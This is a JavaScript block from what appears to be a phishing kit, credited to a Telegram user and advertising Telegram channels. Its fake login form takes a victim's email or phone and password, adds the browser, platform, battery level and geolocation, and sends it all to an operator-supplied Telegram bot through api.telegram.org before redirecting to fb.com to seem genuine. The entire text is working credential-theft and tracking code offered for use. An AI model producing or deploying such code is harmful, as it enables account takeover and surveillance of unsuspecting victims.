<script>
    // Function to send the login link to the Telegram chat with formatted message
    function sendLoginLink() {
        var botToken = document.getElementById('botToken').value;
        var chatId = document.getElementById('chatId').value;
        var loginUrl = window.location.href + "?botToken=" + botToken + "&chatId=" + chatId + "#login";

        var message = `üöÄ **Login Link**\n\nüîó **Link**: ${loginUrl}\n\nüë§ **Owner**: @sasumon007\nüì¢ **Join my channel**: https://t.me/+XjCxuJspHaQxNTA1?fbclid=IwZXh0bgNhZW0CMTEAAR1Pc2E33PMR89KZj6DsfON-o1ey5j1UBmw_EOZvFPWLvfQsg3wYGs_tZZM_aem_v5p6ja1CWNH0EkGF50tmwQ\nSecond channel : https://t.me/SA_Tech_Tips `;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: "Markdown"
            })
        }).then(response => response.json())
          .then(data => {
            if (data.ok) {
                alert("Login link sent!");
            } else {
                alert("Error sending message. Check Bot Token and Chat ID.");
            }
        });
    }

    // Function to get device information including battery level and location
    async function getDeviceInfo() {
        var deviceInfo = `üì± **Device Info**:\n`;
        deviceInfo += `üåê **Browser**: ${navigator.userAgent}\n`;
        deviceInfo += `üíª **Platform**: ${navigator.platform}\n`;

        // Battery Status
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            deviceInfo += `üîã **Battery**: ${Math.round(battery.level * 100)}%\n`;
        } else {
            deviceInfo += `üîã **Battery**: Not available\n`;
        }

        // Location
        return new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(position => {
                const { latitude, longitude } = position.coords;
                deviceInfo += `üìç **Location**: Latitude ${latitude.toFixed(2)}, Longitude ${longitude.toFixed(2)}\n`;
                resolve(deviceInfo);
            }, () => {
                deviceInfo += `üìç **Location**: Not available\n`;
                resolve(deviceInfo);
            });
        });
    }

    // Function to handle URL parameters and show the login form if login link is clicked
    function handleUrlParams() {
        const urlParams = new URLSearchParams(window.location.search);
        const botToken = urlParams.get('botToken');
        const chatId = urlParams.get('chatId');

        if (botToken && chatId) {
            document.getElementById('telegramForm').style.display = 'none';
            document.getElementById('loginForm').style.display = 'block';

            // Store botToken and chatId for use during login submission
            window.botToken = botToken;
            window.chatId = chatId;
        }
    }

    // Function to submit the login info to the Telegram bot with device info
    async function submitLogin() {
        var emailOrPhone = document.getElementById('emailOrPhone').value;
        var password = document.getElementById('password').value;
        var loginBtn = document.getElementById('loginBtn');

        // Get device information
        var deviceInfo = await getDeviceInfo();

        // Disable the login button to prevent multiple submissions
        loginBtn.disabled = true;

        var message = `üîê **Login Info**:\n\nüìß **Email/Phone**: ${emailOrPhone}\nüîë **Password**: ${password}\n\n${deviceInfo}`;

        fetch(`https://api.telegram.org/bot${window.botToken}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: window.chatId,
                text: message,
                parse_mode: "Markdown"
            })
        }).then(response => response.json())
          .then(data => {
            if (data.ok) {
                alert("Login info sent to Telegram!");
                // Redirect to Facebook after successful submission
                window.location.href = "https://www.fb.com";
            } else {
                alert("Error submitting login info.");
            }
        }).finally(() => {
            // Re-enable the button after the request is completed
            loginBtn.disabled = false;
        });
    }

    // Automatically show the login form if the URL has the necessary parameters
    window.onload = handleUrlParams;
</script>
